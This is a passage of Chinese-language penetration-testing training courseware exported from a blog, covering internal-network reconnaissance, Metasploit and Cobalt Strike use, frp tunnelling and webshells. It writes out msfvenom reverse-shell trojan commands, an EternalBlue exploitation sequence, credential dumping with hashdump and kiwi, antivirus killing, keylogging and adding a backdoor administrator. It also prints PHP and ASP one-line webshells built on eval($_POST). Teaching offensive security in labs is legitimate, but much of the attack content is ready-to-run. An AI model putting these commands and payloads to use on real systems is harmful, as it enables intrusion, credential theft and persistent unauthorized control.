title=\"内网信息收集\"></a>内网信息收集</h2><p>浏览器web页面默认保存的账号密码</p>\n<p>查看doc&#x2F;xls&#x2F;txt文件枚举</p>\n<p>mstsc默认rdp登录的历史记录</p>\n<h3 id=\"内网信息收集-1\"><a href=\"#内网信息收集-1\" class=\"headerlink\" title=\"内网信息收集\"></a>内网信息收集</h3><p>1）查看当前主机的 网络配置信息.</p>\n<p>ipconfig &#x2F;all</p>\n<p>2）查询 用户列表.</p>\n<p>net user</p>\n<p>query user || qwinsta &#x2F;&#x2F;可以查看当前在线用户</p>\n<p>3）查询 进程列表.杀软等信息</p>\n<p>tasklist &#x2F;v</p>\n<p>4）查询 操作系统 和 安装软件的版本信息.</p>\n<p>systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本”</p>\n<p>5）查询 端口列表.（可以根据端口判断相应的服务.）</p>\n<p>netstat -ano</p>\n<p>6）查询 补丁列表.</p>\n<p>Systeminfo</p>\n<p>7）查询 本机共享.</p>\n<p>net share</p>\n<p>8）查询 防火墙配置.</p>\n<p>netsh firewall show config</p>\n<p>9）查询 当前权限</p>\n<p>whoami</p>\n<p>10）查询 指定账户的详细信息.</p>\n<p>net user XXX &#x2F;domain                &#x2F;&#x2F; “ XXX ” 是写入账号名.</p>\n<h3 id=\"域内信息收集\"><a href=\"#域内信息收集\" class=\"headerlink\" title=\"域内信息收集\"></a>域内信息收集</h3><p>1）判断是否有 域.</p>\n<p>net view &#x2F;domain</p>\n<p>2）查询 域内所有计算机.</p>\n<p>net view &#x2F;domain:XXX                &#x2F;&#x2F;“XXX” 是输入域名.</p>\n<p>3）查询 域内所有用户组列表.</p>\n<p>net group &#x2F;domain</p>\n<p>4）查询 所有域成员计算机列表.</p>\n<p>net group “domain computers” &#x2F;domain</p>\n<p>5）获取 域密码信息.</p>\n<p>net accounts &#x2F;domain</p>\n<p>6）查看 域内控制器的机器名.</p>\n<p>nltest &#x2F;DCLIST:XXX        &#x2F;&#x2F;“XXX”是输入域名.</p>\n<p>7）查看 域控制器的 主机名 和 IP地址.</p>\n<p>Nslookup -type&#x3D;SRV _ldap._tcp</p>\n<p>8）查询 域内的用户.</p>\n<p>net user &#x2F;domain</p>\n<p>9）查询 域管理员用户.</p>\n<p>net group “domain admins” &#x2F;domain</p>\n<p>10）查看计划任务</p>\n<p>schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</p>\n<p>11）arp -a 查询通信</p>\n<p>12）bat 命令发现主机</p>\n<p>for &#x2F;l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1|find &#x2F;i “ttl&#x3D;”</p>\n<h3 id=\"内网需要关注的漏洞\"><a href=\"#内网需要关注的漏洞\" class=\"headerlink\" title=\"内网需要关注的漏洞\"></a>内网需要关注的漏洞</h3><p>fscan扫描</p>\n<p><a href=\"https://www.lmlphp.com/user/17154/article/item/495730/\">https://www.lmlphp.com/user/17154/article/item/495730/</a></p>\n<p>1.主机漏洞</p>\n<p>1. MS08-067、2. MS17_010、3. CVE-2019-0708、</p>\n<p>4.ms14-0685、5.cve-2020-1472(Zerologon)、6.CVE-2021-42278 + CVE-2021-42287</p>\n<p>2.中间件</p>\n<p>Tomcat、Jboss、WebLogic、WebSphere等</p>\n<p>3.运维系统</p>\n<p>Gitlab、Jenkins、Puppet、Zabbix、Cacti、Hadoop、Spake（大数据）</p>\n<p>4.web系统</p>\n<p>邮件系统（微软OWA）、OA系统等</p>\n<p>5.数据库系统</p>\n<p>MySQL、MSSQL、Redis、Oracle、PostgreSQL、MongoDB、SysBase</p>\n<h2 id=\"漏洞分级\"><a href=\"#漏洞分级\" class=\"headerlink\" title=\"漏洞分级\"></a>漏洞分级</h2><h3 id=\"漏洞分级-1\"><a href=\"#漏洞分级-1\" class=\"headerlink\" title=\"漏洞分级\"></a>漏洞分级</h3><p><a href=\"https://zc.cnvd.org.cn/news/helpList#newsType_6\">https://zc.cnvd.org.cn/news/helpList#newsType_6</a></p>\n<p>CVSS : Common Vulnerability Scoring System，即“通用漏洞评分系统”，是一个“行业公开标准，其被设计用来评测漏洞的严重程度，并帮助确定所需反应的紧急度和重要度”。</p>\n<p>CVSS是安全内容自动化协议（SCAP）的一部分，通常CVSS同CVE一同由美国国家漏洞库（NVD）发布，由美国国家基础建设咨询委员会（NIAC）委托制作，是一套公开的评测标准，经常被用来评比企业资讯科技系统的安全性，并受到eBay、(Symantec)、思科(Cisco)、甲古文(Oracle)等众多厂商支援。</p>\n<p>CVSS评分系统目前已经升级到 3.0版本，网络安全众测平台的漏洞评分使用此版本标准中的基本评价和时效评价两部分的分值。</p>\n<h3 id=\"漏洞查找\"><a href=\"#漏洞查找\" class=\"headerlink\" title=\"漏洞查找\"></a>漏洞查找</h3><p><a href=\"https://www.cnvd.org.cn/\">https://www.cnvd.org.cn/</a></p>\n<p><a href=\"https://www.seebug.org/\">https://www.seebug.org/</a></p>\n<p><a href=\"https://evalshell.com/poc#\">https://evalshell.com/poc#</a></p>\n<p><a href=\"http://wiki.peiqi.tech/\">http://wiki.peiqi.tech/</a></p>\n<p><a href=\"https://sploitus.com/\">https://sploitus.com/</a></p>\n","categories":["原创培训课件"],"tags":["信息收集","漏洞分级"]},{"title":"day4-内网渗透基础一（下午）","url":"/2022/08/16/day4-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%89/","content":"<h1 id=\"day4-内网渗透基础一（下午）\"><a href=\"#day4-内网渗透基础一（下午）\" class=\"headerlink\" title=\"day4-内网渗透基础一（下午）\"></a>day4-内网渗透基础一（下午）</h1><h2 id=\"内网渗透常用攻击思路\"><a href=\"#内网渗透常用攻击思路\" class=\"headerlink\" title=\"内网渗透常用攻击思路\"></a>内网渗透常用攻击思路</h2><h3 id=\"1、攻击思路\"><a href=\"#1、攻击思路\" class=\"headerlink\" title=\"1、攻击思路\"></a>1、攻击思路</h3><p>攻击思路主要有2种：</p>\n<p>1.攻击外网服务器，获取外网服务器的权限，接着利用入侵成功的外网服务器作为跳板，攻击内网其他服务器，最后获得敏感数据，并将数据传递到攻击者，看情况安装长期后门，实现长期控制和获得敏感数据的方式。</p>\n<p>2.攻击办公网的系统、办公网电脑、办公网无线等方式，一般是采用社工，实现控制办公电脑，再用获得的办公网数据，可能是内网的各种登录账号和密码，再获取办公网或者生产网的有用数据。</p>\n<p>一般内网安全检查使用第一种思路，实际的攻击2种思路结合实现。第二种思路，社工的比重更大一些</p>\n<h3 id=\"2、敏感信息\"><a href=\"#2、敏感信息\" class=\"headerlink\" title=\"2、敏感信息\"></a>2、敏感信息</h3><p>需要注意的有：</p>\n<p>高管&#x2F;系统管理员&#x2F;财务&#x2F;人事&#x2F;业务人员的个人电脑</p>\n<p>文件服务器&#x2F;共享服务器</p>\n<p>邮件服务器</p>\n<p>OA服务器</p>\n<p>数据库服务器</p>\n<h3 id=\"3、攻击过程\"><a href=\"#3、攻击过程\" class=\"headerlink\" title=\"3、攻击过程\"></a>3、攻击过程</h3><p>按照第一种思路，可以分为4个阶段：</p>\n<p>信息收集</p>\n<p>漏洞验证&#x2F;漏洞攻击</p>\n<p>后渗透</p>\n<p>日志清理</p>\n<h2 id=\"内网渗透常用工具\"><a href=\"#内网渗透常用工具\" class=\"headerlink\" title=\"内网渗透常用工具\"></a>内网渗透常用工具</h2><p>渗透测试平台类：Metasploit、Cobalt Strike、Empire</p>\n<p>隧道转发类：frp、nps、CS-socks4、msf-socks4   netsh、ew、dnscat2、</p>\n<p>工具：mimikatz、wmiexec、psexec、smbexec</p>\n<p>等等</p>\n<h2 id=\"工具的使用详情以及演示\"><a href=\"#工具的使用详情以及演示\" class=\"headerlink\" title=\"工具的使用详情以及演示\"></a>工具的使用详情以及演示</h2><h3 id=\"Metasploit\"><a href=\"#Metasploit\" class=\"headerlink\" title=\"Metasploit\"></a>Metasploit</h3><h4 id=\"Metasploit-简介\"><a href=\"#Metasploit-简介\" class=\"headerlink\" title=\"Metasploit 简介\"></a>Metasploit 简介</h4><p>Metasploit 是一个渗透测试平台，使您能够查找，利用和验证漏洞。该平台包括 Metasploit 框架及其商业对手，如 Metasploit Pro。</p>\n<p>Metasploit是一个免费的、可下载的框架，通过它可以很容易对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具</p>\n<p>官网： <a href=\"https://www.metasploit.com/\">https://www.metasploit.com/</a></p>\n<h4 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h4><p>模块组织按照不同的用途分为6种类型的模块（Modules）：</p>\n<p>分为辅助模块（Aux）、渗透攻击模块（Exploits）、后渗透攻击模块（Post）、攻击载荷模块（payloads）、编码器模块（Encoders）、空指令模块（Nops）。payload又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等。</p>\n<h4 id=\"工作目录\"><a href=\"#工作目录\" class=\"headerlink\" title=\"工作目录\"></a>工作目录</h4><p>&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p>\n<h4 id=\"专业术语\"><a href=\"#专业术语\" class=\"headerlink\" title=\"专业术语\"></a>专业术语</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">– Exploit，攻击工具/代码</span><br><span class=\"line\">– Payload，攻击载荷</span><br><span class=\"line\">– Shellcode shell 代码</span><br><span class=\"line\">– Module，模块</span><br><span class=\"line\">– Listener，监听器</span><br></pre></td></tr></table></figure>\n<h4 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">常用命令</span><br><span class=\"line\">show exploits – 查看所有可用的渗透攻击程序代码</span><br><span class=\"line\">show auxiliary – 查看所有可用的辅助攻击工具</span><br><span class=\"line\">show options – 查看该模块所有可用选项</span><br><span class=\"line\">show payloads – 查看该模块适用的所有载荷代码</span><br><span class=\"line\">show targets – 查看该模块适用的攻击目标类型</span><br><span class=\"line\">search – 根据关键字搜索某模块</span><br><span class=\"line\">info – 显示某模块的详细信息</span><br><span class=\"line\">use – 进入使用某渗透攻击模块</span><br><span class=\"line\">back – 回退 set/unset – 设置/禁用模块中的某个参数</span><br><span class=\"line\">setg/unsetg – 设置/禁用适用于所有模块的全局参数</span><br><span class=\"line\">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br><span class=\"line\">Cd 更改当前的工作目录</span><br></pre></td></tr></table></figure>\n<h4 id=\"生成可执行文件\"><a href=\"#生成可执行文件\" class=\"headerlink\" title=\"生成可执行文件\"></a>生成可执行文件</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Linux:</span><br><span class=\"line\">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your</span><br><span class=\"line\">Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class=\"line\">Windows:</span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your</span><br><span class=\"line\">Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>\n<h4 id=\"监听\"><a href=\"#监听\" class=\"headerlink\" title=\"监听\"></a>监听</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">set PAYLOAD &lt;Payload name&gt;</span><br><span class=\"line\">set LHOST &lt;LHOST value&gt;</span><br><span class=\"line\">set LPORT &lt;LPORT value&gt;</span><br><span class=\"line\">set ExitOnSession <span class=\"literal\">false</span> 让connection保持连接(即使一个连接退出,仍然保持listening状态)</span><br><span class=\"line\">exploit -j –z -j(作为job开始运行)和-z(不立即进行session交换--也即是自动后台运行)</span><br><span class=\"line\"></span><br><span class=\"line\">也可以在启动的时候监听</span><br><span class=\"line\">msfconsole -x use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_http</span><br><span class=\"line\">set lhost <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>; </span><br><span class=\"line\">set lport <span class=\"number\">1234</span>; </span><br><span class=\"line\">exploit -j</span><br></pre></td></tr></table></figure>\n<h4 id=\"实战演示\"><a href=\"#实战演示\" class=\"headerlink\" title=\"实战演示\"></a>实战演示</h4><h5 id=\"反向连接木马\"><a href=\"#反向连接木马\" class=\"headerlink\" title=\"反向连接木马\"></a>反向连接木马</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//生成生成木马32位</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span> lport=<span class=\"number\">8898</span> -f exe &gt;/root/jiaoxue/dianxin/garck.exe  </span><br><span class=\"line\"><span class=\"comment\">//开启监听</span></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span></span><br><span class=\"line\">set lport <span class=\"number\">8898</span></span><br><span class=\"line\">run</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//生成生成木马64位</span></span><br><span class=\"line\">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=<span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span> lport=<span class=\"number\">8897</span> -f exe &gt;/root/jiaoxue/dianxin/garck641.exe</span><br><span class=\"line\"><span class=\"comment\">//生成生成木马64位</span></span><br><span class=\"line\">msfvenom -a x64 --platform windows -p windows/x64/meterpreter_reverse_tcp lhost=<span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span> lport=<span class=\"number\">8897</span> -f exe &gt;/root/jiaoxue/dianxin/garck64.exe</span><br><span class=\"line\"><span class=\"comment\">//开启监听</span></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span></span><br><span class=\"line\">set lport <span class=\"number\">8897</span></span><br><span class=\"line\">run</span><br><span class=\"line\"></span><br><span class=\"line\">注意：监听的时候payload要和我们所生成的时候使用的payload一致</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">getuid  查看当前用户权限</span><br></pre></td></tr></table></figure>\n<p><img src=\"JURYG7uAYgurz-Vx0T_ny_x8og-Ws3nHJNU2Xrol9ck.png\" alt=\"image\"></p>\n<p> ps 查看进程</p>\n<p><img src=\"_N82MkHz_arlElH4GenDBORtrB5KRV1XDTGbGPtxulE.png\" alt=\"image\"></p>\n<p>sessions 查看全部的会话</p>\n<p><img src=\"UCaA4jkfzIeKvK4tyaxuTvdxkoCTgBdSclTXh7pi_LY.png\" alt=\"image\"></p>\n<p>sessions 11</p>\n<p><img src=\"UuE9j6LGFiKDa-wl1GbX77VGFyKqxmx7iwWV8c3EoHc.png\" alt=\"image\"></p>\n<p>migrate pid &#x2F;&#x2F;进程迁移</p>\n<p><img src=\"DojhwW0MgYCANz18JxAY_YHZOnyONriA2k0my7cVQzg.png\" alt=\"image\"></p>\n<p>sysinfo 系统平台信息</p>\n<p><img src=\"4Uy0mtMrdjXzByYKvMYUU5yqhptu1ldKijvNl8irLIs.png\" alt=\"image\"></p>\n<p>ipconfig</p>\n<p><img src=\"9drDhklIWRmXQjrrkcBGwdO_GctzdHinxo18825DjSQ.png\" alt=\"image\"></p>\n<p>screenshot 屏幕截取</p>\n<p><img src=\"123bn0-SxkiQvhtj1sAq-PFxeInHGnkDT5wnokbuYV0.png\" alt=\"image\"></p>\n<p>run killav 关闭杀毒软件</p>\n<p><img src=\"XiCnp559mFXsonPJu-UG-gAVd9iRUcunBMkUIbAxPaw.png\" alt=\"image\"></p>\n<p>run autoroute -s 10.10.10.0&#x2F;24</p>\n<p><img src=\"fYMxvngkKtABFMFrJWp0l4Bby1WF-LvinrDpPyywbx0.png\" alt=\"image\"></p>\n<p>run autoroute -p 查看自动路由表</p>\n<p><img src=\"52673Z7OaWWeXQpGePVbdmT3JDKe4XEEB4SR1w3rwbc.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; cd 切换目录</span><br><span class=\"line\">meterpreter &gt; rm 删除文件</span><br><span class=\"line\">meterpreter &gt; download C:\\\\Users\\\\<span class=\"number\">123</span>\\\\Desktop\\\\<span class=\"number\">1.</span>txt <span class=\"number\">1.</span>txt 下载文件</span><br><span class=\"line\">meterpreter &gt; upload /<span class=\"keyword\">var</span>/www/wce.exe wce.exe 上传文件</span><br><span class=\"line\">meterpreter &gt; search -d c: -f *.doc 搜索文件</span><br><span class=\"line\">meterpreter &gt; execute -f cmd.exe -i 执行程序/命令</span><br><span class=\"line\">meterpreter &gt; run post/windows/capture/keylog_recorder 键盘记录</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">创建代理通道:</span><br><span class=\"line\">use auxiliary/server/socks_proxy</span><br><span class=\"line\">show options</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"iMfnRdqdYZo9vmkxYpljsnYlbqFxbSUbbfTXHjhB85A.png\" alt=\"image\"></p>\n<p><img src=\"ekp3cSXKfB3gqzhuiKVcuF72ZXKYMZJXUTAw-g_veVk.png\" alt=\"image\"></p>\n<p>shell   &#x2F;&#x2F;进入cmd的shell</p>\n<p>chcp 65001 &#x2F;&#x2F;显示utf8编码的中文字符</p>\n<p><img src=\"b7N2TyaiNnP9gjnKFT8yQ34mQlqr3KSWy9knVH7aV3k.png\" alt=\"image\"></p>\n<h5 id=\"永恒之蓝\"><a href=\"#永恒之蓝\" class=\"headerlink\" title=\"永恒之蓝\"></a>永恒之蓝</h5><p>扫描是否存在永恒之蓝</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class=\"line\">set rhosts <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.10</span></span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"eHUXL4blgnR_ysU6KvEBZBi9CtoxjyphaKK-Bzm06kQ.png\" alt=\"image\"></p>\n<p>攻击阶段</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\">set rhosts <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.10</span></span><br><span class=\"line\">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span></span><br><span class=\"line\">set lport <span class=\"number\">4455</span></span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"7S_RTVPmKFJoCYBGF1l78HQ4n4qRC8yOV4Jyn7QnvW4.png\" alt=\"image\"></p>\n<p>获取hash和明文</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">获取hash</span><br><span class=\"line\">hashdump</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">获取明文</span><br><span class=\"line\">在最新的版本中load mimikatz已经取消 现在使用kiwi模块</span><br><span class=\"line\">load kiwi</span><br><span class=\"line\">creds_all：列举所有凭据</span><br><span class=\"line\">creds_kerberos：列举所有kerberos凭据</span><br><span class=\"line\">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class=\"line\">lsa_dump_sam：dump出lsa的SAM</span><br><span class=\"line\">lsa_dump_secrets：dump出lsa的密文</span><br><span class=\"line\">password_change：修改密码</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>run getgui -e 开启远程终端 run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp </p>\n<p>run getgui -u px -p QWEasd123</p>\n<p><img src=\"pApF6YyjOYdUzUJrsHT_z5NtIVxqKZmMfYG6TZ7xdMg.png\" alt=\"image\"></p>\n<p>但是添加到Administrators组中失败了</p>\n<p>在cmd手动将px用户添加到管理员用户组。</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">net localgroup administrators px /add</span><br></pre></td></tr></table></figure>\n<p><img src=\"MNstxsksQZO1rx1VNqHilWbv8HdTEPNcfpIZSsDlohM.png\" alt=\"image\"></p>\n<h3 id=\"Cobalt-Strike\"><a href=\"#Cobalt-Strike\" class=\"headerlink\" title=\"Cobalt Strike\"></a>Cobalt Strike</h3><h4 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>Cobalt Strike是一款基于java的渗透测试神器，常被业界人称为CS神器。自3.0以后已经不在使用 Metasploit框架而作为一个独立的平台使用，分为客户端与服务端，服务端是一个，客户端可以有多 个，非常适合团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息 和sessions，可模拟APT做模拟对抗，进行内网渗透。</p>\n<h4 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h4><p>.&#x2F;teamserver 192.168.8.133 12345   # 设置强密码，否则容易被爆破 12345是密码</p>\n<p>端口默认的是50050  我这里已经改成了9986</p>\n<h4 id=\"界面\"><a href=\"#界面\" class=\"headerlink\" title=\"界面\"></a>界面</h4><p><img src=\"-Qq4hGxPUVSh4SLA6nhTCv4O7J1dNVlUcBLJGO2og8A.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>新建连接</span><br><span class=\"line\"><span class=\"number\">2.</span>断开当前连接</span><br><span class=\"line\"><span class=\"number\">3.</span>监听器</span><br><span class=\"line\"><span class=\"number\">4.</span>改变视图为Pivot <span class=\"title function_\">Graph</span><span class=\"params\">(视图列表)</span></span><br><span class=\"line\"><span class=\"number\">5.</span>改变视图为Session <span class=\"title function_\">Table</span><span class=\"params\">(会话列表)</span></span><br><span class=\"line\"><span class=\"number\">6.</span>改变视图为Target <span class=\"title function_\">Table</span><span class=\"params\">(目标列表)</span></span><br><span class=\"line\"><span class=\"number\">7.</span>显示所有以获取的受害主机的凭证</span><br><span class=\"line\"><span class=\"number\">8.</span>查看已下载文件</span><br><span class=\"line\"><span class=\"number\">9.</span>查看键盘记录结果</span><br><span class=\"line\"><span class=\"number\">10.</span>查看屏幕截图</span><br><span class=\"line\"><span class=\"number\">11.</span>生成无状态的可执行exe木马</span><br><span class=\"line\"><span class=\"number\">12.</span>使用java自签名的程序进行钓鱼攻击</span><br><span class=\"line\"><span class=\"number\">13.</span>生成office宏病毒文件</span><br><span class=\"line\"><span class=\"number\">14.</span>为payload提供web服务以便下载和执行</span><br><span class=\"line\"><span class=\"number\">15.</span>提供文件下载，可以选择Mime类型</span><br><span class=\"line\"><span class=\"number\">16.</span>管理Cobalt Strike上运行的web服务</span><br><span class=\"line\"><span class=\"number\">17.</span>帮助</span><br><span class=\"line\"><span class=\"number\">18.</span>关于</span><br></pre></td></tr></table></figure>\n<h4 id=\"支持的协议\"><a href=\"#支持的协议\" class=\"headerlink\" title=\"支持的协议\"></a>支持的协议</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Beacon DNS</span><br><span class=\"line\">Beacon HTTP</span><br><span class=\"line\">Beacon HTTPS</span><br><span class=\"line\">Beacon SMB</span><br><span class=\"line\">Beacon TCP</span><br><span class=\"line\">External C2</span><br><span class=\"line\">Foreign HTTP</span><br><span class=\"line\">Foreign HTTPS</span><br></pre></td></tr></table></figure>\n<p>建立一个监听</p>\n<p><img src=\"Iru4Sq5Wycx7FCqc4cWXN1N1qMAm22S3vQ9q8XRDmhU.png\" alt=\"image\"></p>\n<p>生成木马</p>\n<p><img src=\"sG81Aqjwe6LaiuMiv3G6cmpFlQF_gUIal1XYxazmH_M.png\" alt=\"image\"></p>\n<p><img src=\"UgygU8AdeYKnKHsQmxrcO59LtktrgWduw-Dl575aJmE.png\" alt=\"image\"></p>\n<p>上线</p>\n<p><img src=\"gijKiSeFtyLfv5bSZic5PjTKinAxtoNEPDdwApWf5pM.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>设置时间间隔</span><br><span class=\"line\"><span class=\"number\">2.</span>浏览文件</span><br><span class=\"line\"><span class=\"number\">3.</span>vnc用户交互</span><br><span class=\"line\"><span class=\"number\">4.</span>进程列表</span><br><span class=\"line\"><span class=\"number\">5.</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"frp\"><a href=\"#frp\" class=\"headerlink\" title=\"frp\"></a>frp</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p>\n<p>1、利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。</p>\n<p>2、对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</p>\n<p>3、利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p>\n","categories":["原创培训课件"],"tags":["Metasploit","Cobalt Strike","frp"]},{"title":"day6-webshell详解一（上午：一句话、内存马）","url":"/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/","content":"<h1 id=\"day6-webshell详解一（上午：一句话、内存马）\"><a href=\"#day6-webshell详解一（上午：一句话、内存马）\" class=\"headerlink\" title=\"day6-webshell详解一（上午：一句话、内存马）\"></a>day6-webshell详解一（上午：一句话、内存马）</h1><p>常见Webshell类型(一句话、冰蝎．哥斯拉、内存马等),上传方法和利用工具详解</p>\n<h2 id=\"webshell详解\"><a href=\"#webshell详解\" class=\"headerlink\" title=\"webshell详解\"></a>webshell详解</h2><p>webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序. webshell是web的一个管理工具，可以对web服务器进行操作的权限。 </p>\n<p>webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途， 但是由于webshell的功能比较强大，可以上传下载文件，查看数据库， 甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的）. 通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下， 然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p>\n<p> 黑客通常利用常见的漏洞，如SQL注入、远程文件包含(RFI)、FTP，甚至使用跨站点脚本攻击(XSS)等 方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p>\n<p> 简单的说来，webshell就是一个asp、jsp或php木马后门，黑客在入侵了一个网站后， 常常在将这些 asp或php木马后门文件放置在网站服务器的web目录中，与正常的网页文件混在一起。 然后黑客就可以用web的方式，通过asp或php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。</p>\n<h2 id=\"webshell种类\"><a href=\"#webshell种类\" class=\"headerlink\" title=\"webshell种类\"></a>webshell种类</h2><p>webshell又称脚本木马，一般分为大马、小马、一句话木马。</p>\n<p>大马，体积大、功能齐全、能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权。</p>\n<p>小马，一般而言，我们在上传文件的时候，会被限制上传的文件大小或是拦截的情况，那么我通过小马来上传大马，实现我们想要的功能。</p>\n<p>一句话木马，短小精悍、功能强大、隐蔽性好、使用客户端可以快速管理webshell。</p>\n<h2 id=\"常见一句话木马\"><a href=\"#常见一句话木马\" class=\"headerlink\" title=\"常见一句话木马\"></a>常见一句话木马</h2><h3 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[value]); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">assert</span>(<span class=\"variable\">$_POST</span>[value]);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/[email]/e&quot;</span>,<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;h&#x27;</span>],<span class=\"string\">&quot;error&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"asp\"><a href=\"#asp\" class=\"headerlink\" title=\"asp\"></a>asp</h3><figure class=\"highlight csharp\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%<span class=\"function\">eval <span class=\"title\">request</span> (<span class=\"params\"><span class=\"string\">&quot;value&quot;</span></span>)%&gt;</span></span><br></pre></td></tr></table></figure>\n<figure 